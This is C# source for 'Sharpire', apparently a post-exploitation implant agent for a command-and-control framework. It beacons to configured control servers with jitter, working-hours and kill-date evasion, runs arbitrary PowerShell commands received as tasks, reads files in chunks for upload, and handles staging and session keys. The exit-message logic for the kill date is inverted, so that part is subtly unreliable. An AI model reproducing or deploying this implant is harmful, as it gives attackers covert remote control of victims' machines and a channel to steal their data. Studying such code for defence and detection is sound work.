using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.IO;
using System.Linq;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Text;
using System.Threading;
using System.Text.RegularExpressions;

namespace Sharpire
{
    class Agent
    {
        private byte[] packets;
        
        public SessionInfo sessionInfo;
        private Coms coms;
        private JobTracking jobTracking;
        
        public Agent(SessionInfo sessionInfo)
        {

            this.sessionInfo = sessionInfo;
            coms = new Coms(sessionInfo);
            jobTracking = new JobTracking();
        }
        
        public void Execute()
        {
            while (true)
            {
                Run();
            }
        }
        
        internal Coms GetComs()
        {
            return coms;
        }
        
        private void Run()
        {
            if (sessionInfo.GetKillDate().CompareTo(DateTime.Now) < 0 || coms.MissedCheckins > sessionInfo.GetDefaultLostLimit())
            {
                jobTracking.CheckAgentJobs(ref packets, ref coms);

                if (packets != null)
                {
                    coms.SendMessage(packets);
                }

                string message;
                if(sessionInfo.GetKillDate().CompareTo(DateTime.Now) > 0)
                {
                    message = "[!] Agent " + sessionInfo.GetAgentId() + " exiting: past killdate";
                }
                else
                {
                    message = "[!] Agent " + sessionInfo.GetAgentId() + " exiting: Lost limit reached";
                }

                ushort result = 0;
                coms.SendMessage(coms.EncodePacket(2, message, result));
                Environment.Exit(1);
            }
            
            if (sessionInfo.GetWorkingHoursStart() != null && sessionInfo.GetWorkingHoursEnd() != null)
            {
                DateTime now = DateTime.Now;
                DateTime start = sessionInfo.GetWorkingHoursStart();
                DateTime end = sessionInfo.GetWorkingHoursEnd();

                if (end < start)
                {
                    end = end.AddDays(1);
                }

                if (now > end)
                {
                    start = start.AddDays(1);
                }

                TimeSpan sleep = start - now;

                if (sleep.TotalMilliseconds > 0)
                {
                    Thread.Sleep((int)sleep.TotalMilliseconds);
                }
            }

            if (0 != sessionInfo.GetDefaultDelay())
            {
                int max = (int)((sessionInfo.GetDefaultJitter() + 1) * sessionInfo.GetDefaultDelay());
                if (max > int.MaxValue)
                {
                    max = int.MaxValue - 1;
                }

                int min = (int)((sessionInfo.GetDefaultJitter() - 1) * sessionInfo.GetDefaultDelay());
                if (min < 0)
                {
                    min = 0;
                }

                int sleepTime;
                if (min == max)
                {
                    sleepTime = min;
                }
                else
                {
                    Random random = new Random();
                    sleepTime = random.Next(min, max);
                }

                Thread.Sleep(sleepTime * 1000);
            }

            byte[] jobPackets = jobTracking.GetAgentJobsOutput(ref coms);
            if (jobPackets.Length > 0)
            {
                coms.SendMessage(jobPackets);
            }

            byte[] taskData = coms.GetTask();
            if (taskData != null && taskData.Length > 0)
            {
                coms.MissedCheckins = 0;
                if (Convert.ToBase64String(taskData) != sessionInfo.GetDefaultResponse())
                {
                    coms.DecodeRoutingPacket(taskData, ref jobTracking);
                }
            }
            GC.Collect();
        }

        internal static byte[] GetFilePart(string file, int index, int chunkSize)
        {
            byte[] output = new byte[0];
            try
            {
                FileInfo fileInfo = new FileInfo(file);
                using (FileStream fileStream = File.OpenRead(file))
                {
                    if (fileInfo.Length < chunkSize)
                    {
                        if (index == 0)
                        {
                            output = new byte[fileInfo.Length];
                            fileStream.Read(output, 0, output.Length);
                            return output;
                        }
                        else
                        {
                            return output;
                        }
                    }
                    else
                    {
                        output = new byte[chunkSize];
                        int start = index * chunkSize;
                        fileStream.Seek(start, 0);
                        int count = fileStream.Read(output, 0, output.Length);
                        if (count > 0)
                        {
                            if (count != chunkSize)
                            {
                                byte[] output2 = new byte[count];
                                Array.Copy(output, output2, count);
                                return output2;
                            }
                            else
                            {
                                return output;
                            }
                        }
                        else
                        {
                            return new byte[0];
                        }
                    }
                }
            }
            catch
            {
                return output;
            }
        }
        
        internal static string InvokeShellCommand(string command)
        {
            if (string.IsNullOrEmpty(command))
            {
                return "no shell command supplied";
            }
            // Strip the legacy "shell " prefix the server still ships for back-compat
            // with deployed agents.
            if (command.StartsWith("shell ", StringComparison.OrdinalIgnoreCase))
            {
                command = command.Substring(6);
            }
            return RunPowerShell(command);
        }

        internal static string ChangeDirectory(string path)
        {
            if (string.IsNullOrEmpty(path))
            {
                throw new ArgumentException("no path supplied");
            }
            Directory.SetCurrentDirectory(path);
            return Directory.GetCurrentDirectory();
        }

        internal static string RunPowerShell(string command)
        {
            using (Runspace runspace = RunspaceFactory.CreateRunspace())
            {
                runspace.Open();

                using (Pipeline pipeline = runspace.CreatePipeline())
                {
                    pipeline.Commands.AddScript(command);
                    pipeline.Commands.Add("Out-String");

                    StringBuilder sb = new StringBuilder();
                    try
                    {
                        Collection<PSObject> results = pipeline.Invoke();
                        foreach (PSObject obj in results)
                        {
                            sb.Append(obj);
                        }
                    }
                    catch (ParameterBindingException error)
                    {
                        sb.Append("[-] ParameterBindingException: " + error.Message);
                    }                    
                    catch (CmdletInvocationException error)
                    {
                        sb.Append("[-] CmdletInvocationException: " + error.Message);
                    }
                    catch (RuntimeException error)
                    {
                        sb.Append("[-] RuntimeException: " + error.Message);
                    }

                    return sb.ToString();
                }
            }
        }
    }
    
    sealed class SessionInfo
    {
        private string[] ControlServers;
        private readonly string StagingKey;
        private byte[] StagingKeyBytes;
        private readonly string AgentLanguage;

        private string[] TaskURIs;
        private string UserAgent;
        private double DefaultJitter;
        private uint DefaultDelay;
        private uint DefaultLostLimit;

        private string StagerUserAgent;
        private string StagerURI;
        private string Proxy;
        private string ProxyCreds;
        private DateTime KillDate;
        private DateTime WorkingHoursStart;
        private DateTime WorkingHoursEnd;
        private string AgentID;
        private string SessionKey;
        private byte[] SessionKeyBytes;
        private byte[] PublicKeyBytes;
        private byte[] PrivateKeyBytes;

        public SessionInfo(string[] args)
        {
            ControlServers = args[0].Split(new[] { "," }, StringSplitOptions.RemoveEmptyEntries);  
            StagingKey = args[1];
            AgentLanguage = args[2];
            StagingKeyBytes = Encoding.ASCII.GetBytes(StagingKey);
            TaskURIs = new string[] {};
            UserAgent = "";
            StagerUserAgent = "";
            StagerURI = "";
            Proxy = "default";
            ProxyCreds = "";
           

        }

        public string[] GetControlServers() { return ControlServers; }
        public string GetStagingKey() { return StagingKey; }
        public byte[] GetStagingKeyBytes() { return StagingKeyBytes; }

        public string[] GetTaskUrIs() { return TaskURIs; }
        public string GetUserAgent() { return UserAgent; }
        public double GetDefaultJitter() { return DefaultJitter; }

        public byte[] GetPublicKeyBytes() { return PublicKeyBytes; }
        public byte[] GetPrivateKeyBytes() { return PrivateKeyBytes; }

        public void SetPublicKeyBytes(byte[] Pkbytes)
        {
            PublicKeyBytes = Pkbytes;
        }

        public void SetPrivateKeyBytes(byte[] Skbytes)
        {
            PrivateKeyBytes = Skbytes;
        }
        public void SetDefaultJitter(double defaultJitter)
        {
            DefaultJitter = defaultJitter;
        }
        public uint GetDefaultDelay() { return DefaultDelay; }
        public void SetDefaultDelay(uint defaultDelay)
        {
            DefaultDelay = defaultDelay;
        }
        public uint GetDefaultLostLimit() { return DefaultLostLimit; }
        public void SetDefaultLostLimit(uint defaultLostLimit)
        {
            this.DefaultLostLimit = defaultLostLimit;
        }
        
        public void SetDefaultResponse(string defaultResponse) { this.DefaultResponse = defaultResponse; }
        public string DefaultResponse { get; set; }

        public string GetDefaultResponse() { return DefaultResponse; }

        public string GetStagerUserAgent() { return StagerUserAgent; }
        public DateTime GetKillDate() { return KillDate; }

        public void SetProfile(string profile)
        {
            TaskURIs = profile.Split('|').First().Split(',');
            UserAgent = profile.Split('|').Last();
        }
        
        public void SetKillDate(string killDate)
        {
            Regex regex = new Regex("^\\d{1,2}\\/\\d{1,2}\\/\\d{4}$");

            if (string.IsNullOrWhiteSpace(killDate))
            {
                KillDate = DateTime.MaxValue;
            }
            else if (regex.Match(killDate).Success)
            {
                DateTime.TryParse(killDate, out KillDate);
            }
        }

        public void SetWorkingHours(string workingHours)
        {
            Regex regex = new Regex("^[0-9]{1,2}:[0-5][0-9]$");

            if (string.IsNullOrWhiteSpace(workingHours))
            {
                WorkingHoursStart = DateTime.Today.AddHours(0);   // 00:00
                WorkingHoursEnd = DateTime.Today.AddHours(23).AddMinutes(59);  // 23:59
                return;
            }

            string[] times = workingHours.Split('-');
            if (times.Length == 2)
            {
                string start = times[0].Trim();
                string end = times[1].Trim();

                if (regex.Match(start).Success)
                    DateTime.TryParse(start, out WorkingHoursStart);

                if (regex.Match(end).Success)
                    DateTime.TryParse(end, out WorkingHoursEnd);
            }
        }

        public DateTime GetWorkingHoursStart() { return WorkingHoursStart; }
        public DateTime GetWorkingHoursEnd() { return WorkingHoursEnd; }

        public void SetAgentId(string AgentID) { this.AgentID = AgentID; }
        public string GetAgentId() { return AgentID; }

        public byte[] SetSessionKeyBytes(byte[] sessionKeyBytes) { return this.SessionKeyBytes = sessionKeyBytes; }
        public string GetSessionKey() { return SessionKey; }
        public byte[] GetSessionKeyBytes() { return SessionKeyBytes; }
    }
}
